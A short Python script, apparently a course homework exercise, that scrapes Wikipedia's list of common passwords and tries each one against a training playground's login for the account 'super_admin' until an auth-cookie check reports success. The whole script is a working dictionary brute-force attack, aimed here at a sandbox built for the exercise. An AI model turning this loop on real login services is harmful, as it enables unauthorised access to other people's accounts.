import requests
import pandas as pd

url = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"

df = pd.read_html(url, header=0)[1].iloc[:, 1:]
multi_array = df.values.tolist()
to_one_array = [item for sublist in multi_array for item in sublist]
get_unique_passwords = list(set(to_one_array))
print(get_unique_passwords)

for password in get_unique_passwords:
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                             data={"login": "super_admin", "password": password})
    cookie_dict = dict(response.cookies)
    post_cookie = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookie_dict)
    print(post_cookie.text)
    if post_cookie.text == 'You are authorized':
        print(f'Finally. The correct password is "{password}"')
        break